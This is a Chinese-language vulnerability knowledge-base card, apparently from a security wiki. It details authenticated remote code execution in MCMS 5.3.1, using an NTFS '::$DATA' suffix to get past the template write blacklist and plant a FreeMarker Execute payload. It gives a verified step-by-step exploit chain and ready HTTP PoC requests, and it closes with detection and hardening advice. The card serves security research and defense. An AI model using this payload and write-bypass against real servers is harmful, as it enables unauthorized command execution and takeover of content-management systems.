---
id: web-generic-ssti-mcms-5-3-1-writefilecontent-ads-ftl-rce
title: MCMS 5.3.1 writeFileContent 模板文件写入：`::$DATA` 绕过 ftl 后缀黑名单写 form.ftl，访问 /ms/cms/content/form 触发 FreeMarker RCE
type: scenario
domain: web
path: web/generic/ssti
technique: mcms-writefilecontent-ntfs-ads-ftl-freemarker-rce
tags:
- java
- freemarker
- ssti
- mcms
- mingsoft
- ntfs-ads
- file-write
- rce
cve: []
affected_versions: MCMS 5.3.1
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V681
  verified_at: '2026-11-13T13:44:20+08:00'
  notes: '已对照原文正文与15张图核对：图02/03/04确认 writeFileContent 源码（FileUtil.exist 前置、checkFileType 按 uploadFileDenied=exe,jsp,xml,sh,bat,py,ftl,jspx 逐个 equalsIgnoreCase）；图06 经 :: 写入 form.ftl 的 Execute 载荷；图05 form.ftl 默认存在；图08 ContentAction#form 返回视图（源码为 "/cms/content/form"，卡内已按截图补前导斜杠）；图09 访问 /ms/cms/content/form 弹出计算器。修正：视图名带前导斜杠。未验证点：未复跑 PoC；getSuffix 截取 ftl::$DATA 属按实现对 FileUtil 的推断（原文未贴 getSuffix 源码）；Linux 不适用 ::。dedup 与 web-generic-ssti-mcms-template-edit-freemarker-rce 同产品不同入口/绕过/渲染路由，非同一利用链，append_scenario 理由成立；dup-scan 无涉及本卡 pair。'
url: /docs/web/generic/ssti/web-generic-ssti-mcms-5-3-1-writefilecontent-ads-ftl-rce/
draft: false
kb_aliases:
- MCMS 5.3.1 模板注入
- TemplateAction#writeFileContent
- /ms/basic/template/writeFileContent.do
- ::$DATA 绕过后缀
- WEB-INF/manager/cms/content/form.ftl
- /ms/cms/content/form
---

## 一句话结论

登录 MCMS 后台后，模板管理的写文件接口 `/ms/basic/template/writeFileContent.do` 只对 `fileName` 做后缀黑名单（exe、jsp、xml、sh、bat、py、ftl、jspx）；在 Windows 下把文件名写成 `WEB-INF\manager\cms\content\form.ftl::$DATA`，`FileUtil.getSuffix` 取到的是 `ftl::$DATA` 而非 `ftl`，从而绕过检查并覆盖已存在的 `form.ftl`；随后访问 `GET /ms/cms/content/form`，`ContentAction#form` 返回视图 `"/cms/content/form"`（截图源码含前导斜杠），FreeMarker 渲染被写入的模板，执行 `${"freemarker.template.utility.Execute"?new()("calc")}` 实现 RCE。

## 原理

- **写接口与检查**：`net.mingsoft.basic.action.TemplateAction#writeFileContent` 取 `fileName` 拼成模板真实路径，先 `FileUtil.exist` 校验文件存在，再进入 `checkFileType`。`checkFileType` 从配置 `uploadFileDenied` 读取拒绝后缀列表（截图值 `exe,jsp,xml,sh,bat,py,ftl,jspx`），用 `FileUtil.getSuffix(fileName)` 取后缀并逐个 `equalsIgnoreCase` 比较，命中即拒绝。
- **`::$DATA` 绕过**：Windows NTFS 支持备用数据流（ADS），`form.ftl::$DATA` 表示 `form.ftl` 的默认数据流，文件系统实际写入的仍是 `form.ftl` 本体。`getSuffix("...form.ftl::$DATA")` 以最后一个 `.` 之后作为后缀，得到 `ftl::$DATA`，不等于黑名单中的 `ftl`，因此检查通过；`FileUtil.exist` 对已存在的 `form.ftl` 返回 true，正好满足前置条件（该文件在默认模板中已存在）。
- **写入位置与触发**：`webapp/WEB-INF/manager/cms/content/form.ftl` 是后台内容管理表单的 FreeMarker 模板。原文把 `fileContent` 写成 `${"freemarker.template.utility.Execute"?new()("calc")}`，热部署后访问 `/ms/cms/content/form`，`ContentAction#form` 方法返回 `"/cms/content/form"` 视图名，Spring MVC 交给 FreeMarker 解析该模板，`?new()` 实例化 `freemarker.template.utility.Execute` 并执行命令。
- **前提**：需要后台会话（原文使用登录后的 SHIRO_SESSION_ID/rememberMe Cookie）；接口受后台权限控制，文章未给出未授权利用。Linux 下 `::$DATA` 不生效，需另找后缀绕过。

## 触发条件

- 目标为 MCMS 5.3.1（原文标注该版本，提交后已修复）。
- Windows 部署，且攻击者已取得后台会话（模板管理/写文件权限）。
- 目标模板目录中 `WEB-INF/manager/cms/content/form.ftl` 已存在（默认模板即存在），使 `FileUtil.exist` 校验通过。
- FreeMarker 版本允许 `?new()` 实例化 `freemarker.template.utility.Execute`（原文环境可直接执行）。

## 利用步骤

1. 登录后台，进入 系统设置-模板管理，抓取模板编辑保存请求，确认接口 `/ms/basic/template/writeFileContent.do` 与参数 `fileName`、`name`、`fileNamePrefix`、`fileContent`。
2. 发送写文件请求：`fileName=WEB-INF\manager\cms\content\form.ftl::$DATA`，`fileContent=${"freemarker.template.utility.Execute"?new()("calc")}`（URL 编码后提交）。
3. 服务端 `checkFileType` 因后缀为 `ftl::$DATA` 放行，写入实际文件 `form.ftl`。
4. 访问 `GET /ms/cms/content/form` 触发 FreeMarker 渲染，弹出计算器/执行命令。
5. 清理：把 `form.ftl` 恢复原内容，删除测试产生的文件。

## PoC

```http
POST /ms/basic/template/writeFileContent.do HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

fileName=WEB-INF\manager\cms\content\form.ftl::$DATA&name=about.htm&fileNamePrefix=template\1/\default\&fileContent=${"freemarker.template.utility.Execute"?new()("calc")}
```

原文实际提交为 URL 编码形式，解码后即上面的内容；随后访问：

```http
GET /ms/cms/content/form HTTP/1.1
Host: target:8080
```

返回视图 `"/cms/content/form"` 时执行 `calc`（原文截图弹出计算器）。

## 变体与关联

- **同产品其他 SSTI 入口**：MCMS 后台模板编辑 + 静态化/自定义页面渲染见 [[web-generic-ssti-mcms-template-edit-freemarker-rce]]；本卡的价值是"写任意模板文件 + ADS 后缀绕过 + 指定渲染路由"这条更直接的通路。
- **ADS 后缀绕过通用卡**：[[web-generic-file-upload-windows-ntfs-data-stream-extension-bypass]]（`::$DATA` 让后缀检查失效，落到原文件名）。
- **同产品上传入口**：[[web-generic-file-upload-mcms-uploadtemplate-zip-magic-header-jsp]]、[[web-java-component-mcms-fileaction-upload-blacklist-jspx-ads]]。
- **FreeMarker 通用载荷**：`?new()` Execute、TemplatesImpl、ObjectConstructor 等均可能因版本/沙箱配置不同而生效；本卡只验证 Execute。

## 检测与防御

- **检测**：后台请求中出现 `writeFileContent` 且 `fileName` 含 `::$DATA`、`.ftl`、`..\` 等特征；模板目录文件被非模板管理流程改写；随后访问 `/ms/cms/content/form` 等渲染路由；FreeMarker 日志出现 `freemarker.template.utility.Execute`。
- **防御**：升级到修复版本；写模板接口对 `fileName` 做规范化（`getCanonicalPath`）并限制在模板根目录内，后缀用白名单且拒绝 `:`/ADS 字符；禁用或限制 FreeMarker `?new()`（`TemplateClassResolver.SAFER_RESOLVER`）；模板编辑权限收敛并审计；非必要不在生产开放在线模板编辑。
